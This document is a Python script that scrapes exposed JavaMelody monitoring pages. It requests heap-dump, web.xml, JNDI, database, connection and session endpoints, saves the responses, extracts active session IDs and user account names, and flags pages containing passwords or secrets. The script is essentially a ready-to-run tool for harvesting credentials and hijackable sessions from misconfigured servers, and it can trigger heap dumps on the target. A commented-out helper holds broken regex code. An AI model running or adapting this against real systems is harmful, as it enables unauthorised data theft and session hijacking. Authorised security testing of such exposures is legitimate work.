import argparse
import re
import json
import httpx
from colorama import Fore, Style, init


h = {'X-Request-Reason':'greetings from notnci'}
tags = ["username", "user", "password", "secret"]



def scan_endpoints(client, url, endpoints, jsond, df=True):
    filename = url[url.find("://") + 3:-11]
    data = []
    with open(f"{filename}.txt", "w+") as wf:
        for item in endpoints:
            try:
                r = client.get(f"{url}" + str(item), headers=h)
                if r.status_code == 200:
                    print(f"[+] Valid page found: {url}{str(item)} [+]")
                    if df:
                        wf.write(f"====={url}{str(item)}======\n")
                        if str(item) == endpoints[-1]:
                            print("Checking for active sessions...")
                            sessions = re.findall(r"sessionId=\S{32}", r.text) #session IDs are 32 chars long in java melody
                            users = re.findall(r"Users\/\S{32}", r.text) #the Users assigned machine names are also 32 chars
                            for match in sessions:
                                print(Fore.GREEN + f"[+] Active session with ID: {match} [+]" + Style.RESET_ALL)
                                wf.write(f"Active session with ID: {match}")
                            for match in users:
                                print(Fore.GREEN + f"[+] Active user with account: {match} [+]" + Style.RESET_ALL)
                                wf.write(f"Active user with account: {match}")
                        wf.write(f"{r.text}")
                    if jsond:
                        t = r.text.replace("&nbsp;", " ")
                        idata = dict(url=f"{url}{str(item)}", data=f"{t}")
                        if any(tag in t for tag in tags):
                            print(Fore.GREEN + f"[+] Sensitive information found in {url}{str(item)} [+]")
                            print(Style.RESET_ALL)
                        data.append(idata)
                else:
                    print(f"{str(item)} not accessible: {r.status_code}")
            except Exception as e:
                print(f"Error: {e}")
                continue
    return json.dumps(data)

"""
def scrape_endpoints(client, url):
    parts = []
    actions = []

    part_match = r"\?part=[a-z]{4-16}+"
    action_match = r"\?action=[a-z]{4-16}+"
    r = client.get(url)
    soup = BeautifulSoup(r.text, "html.parser")
    soup.prettify()
    parts = soup.find_all('a')
    for item in parts:
        #print(item)
        pm = re.findall(part_match, str(item))
        am = re.findall(action_match, str(item))
        if pm:
            if pm not in parts:
                parts.append(pm)
        elif am:
            if am not in actions:
                actions.append(am)
        else:
            continue
    return parts, actions
"""

#thanks stackoverflow https://stackoverflow.com/a/43357954
def str2bool(v):
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')

def main():
    #this should make the colors work cross platform
    init(convert=True)
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="URL of the java melody debug page", required=True)
    parser.add_argument("--dump", help="dumps the contained data automatically to stdout")
    parser.add_argument("--json", help="Saves the output in json format", type=str2bool, nargs='?',
                        const=True, default=False)
    args = parser.parse_args()

    endpoints = ["?action=heap_dump", "?part=heaphisto", "?part=web.xml", "?part=jndi", "?part=processes", "?part=connections", "?part=database", "?part=sessions"]

    if 'http://' not in args.url and 'https://' not in args.url and "monitoring" not in args.url:
        print("Not a properly formatted URL, make sure to include http(s):// and the monitoring endpoint location")
        exit()
    
    print(f"Preparing to scrape Java Melody debug info from {args.url}")

    with httpx.Client(verify=False) as client:
        print("Checking if host is up...")
        try:
            r = client.get(f"{args.url}")
        except Exception as e:
            print(f"Error: {e}")
            exit()
        if r.status_code != 200:
            print("[!] Host seems to be down, exiting... [!]")
            exit(1)
        print("[+] Host is up [+]")
        dumped = scan_endpoints(client, args.url, endpoints, args.json)
        if args.json:
            filename = args.url[args.url.find("://") + 3:-11]
            with open(f"{filename}.json", "w") as of:
                of.write(dumped)
                print("Wrote JSON to file")


if __name__ == "__main__":
    main()
